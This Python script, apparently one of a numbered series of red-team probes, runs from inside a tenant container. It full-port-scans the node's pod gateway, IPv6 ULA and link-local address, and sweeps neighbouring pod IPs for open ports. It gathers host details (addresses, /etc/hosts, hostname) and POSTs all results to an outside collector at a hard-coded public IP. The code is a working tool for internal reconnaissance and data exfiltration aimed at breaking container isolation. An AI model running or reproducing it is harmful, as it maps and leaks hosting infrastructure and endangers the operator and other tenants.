#!/usr/bin/env python3
"""probe32 - close the two internal gaps: full-range scans of the pod gateway and the node ULA.

Earlier work full-scanned only 169.254.1.2 (node link-local gateway): 22, 4222, 4646, 9955, 13133, 21543.
Never scanned: 10.150.0.1 (the pod-network gateway, a different interface to the same node) and the
node's ULA. Both are one hop away from a tenant container.

Bounded: connect() only, no payloads beyond a 60-byte banner read, no credentials.
Results POSTed to the collector because a container cannot be read any other way.
"""
import json, os, socket, subprocess, time
from concurrent.futures import ThreadPoolExecutor

COLLECTOR = "http://208.87.134.252:9200/rt32"
NODE_LLA = "169.254.1.2"
POD_GW = "10.150.0.1"
NODE_ULA = "fda7:a938:5bfe:5fa6:0:5e9:67ef:f8d"
CONTROLS = {22, 4646, 9955}
TIMEOUT = 0.5


def probe(host, port, fam):
    s = socket.socket(fam, socket.SOCK_STREAM)
    s.settimeout(TIMEOUT)
    try:
        if s.connect_ex((host, port)) == 0:
            banner = b""
            try:
                s.settimeout(1.2)
                banner = s.recv(60)
            except Exception:
                pass
            return port, True, banner.decode("latin-1", "replace")
        return port, False, ""
    except Exception:
        return port, False, ""
    finally:
        try:
            s.close()
        except Exception:
            pass


def sweep(host, fam, workers=200):
    out = []
    t0 = time.time()
    with ThreadPoolExecutor(max_workers=workers) as ex:
        for port, ok, banner in ex.map(lambda p: probe(host, p, fam), range(1, 65536)):
            if ok:
                out.append({"port": port, "banner": banner})
                print(f"OPEN {host} {port} {banner[:40]!r}", flush=True)
    return {"host": host, "seconds": int(time.time() - t0), "open": out}


def facts():
    f = {}
    for cmd in (["ip", "-br", "addr"], ["cat", "/etc/hosts"], ["cat", "/etc/hostname"]):
        try:
            f[" ".join(cmd)] = subprocess.run(cmd, capture_output=True, text=True, timeout=8).stdout[:1200]
        except Exception as e:
            f[" ".join(cmd)] = f"err {e}"
    return f


res = {"stage": "start", "facts": facts(), "scans": []}
print(json.dumps(res["facts"])[:400], flush=True)

# /24 neighbours on the pod network, cheap port set, to find other gateways
try:
    res["podnet"] = []
    def p24(ip):
        hits = []
        for port in (22, 80, 443, 8080, 4646):
            _, ok, b = probe(ip, port, socket.AF_INET)
            if ok:
                hits.append({"ip": ip, "port": port, "banner": b})
        return hits
    with ThreadPoolExecutor(max_workers=64) as ex:
        for hits in ex.map(p24, [f"10.150.0.{i}" for i in range(1, 40)]):
            res["podnet"].extend(hits)
except Exception as e:
    res["podnet_err"] = str(e)

res["scans"].append(sweep(POD_GW, socket.AF_INET))
res["scans"].append(sweep(NODE_ULA, socket.AF_INET6))
res["scans"].append(sweep(NODE_LLA, socket.AF_INET))  # control: must reproduce the known set
res["stage"] = "done"
for s in res["scans"]:
    print(f"RESULT {s['host']}: {len(s['open'])} open in {s['seconds']}s -> {[o['port'] for o in s['open']]}", flush=True)

try:
    import urllib.request
    urllib.request.urlopen(urllib.request.Request(COLLECTOR, data=json.dumps(res).encode(),
                           headers={"Content-Type": "application/json"}), timeout=25)
    print("posted", flush=True)
except Exception as e:
    print("post failed:", e, flush=True)
    print("FULL:" + json.dumps(res), flush=True)
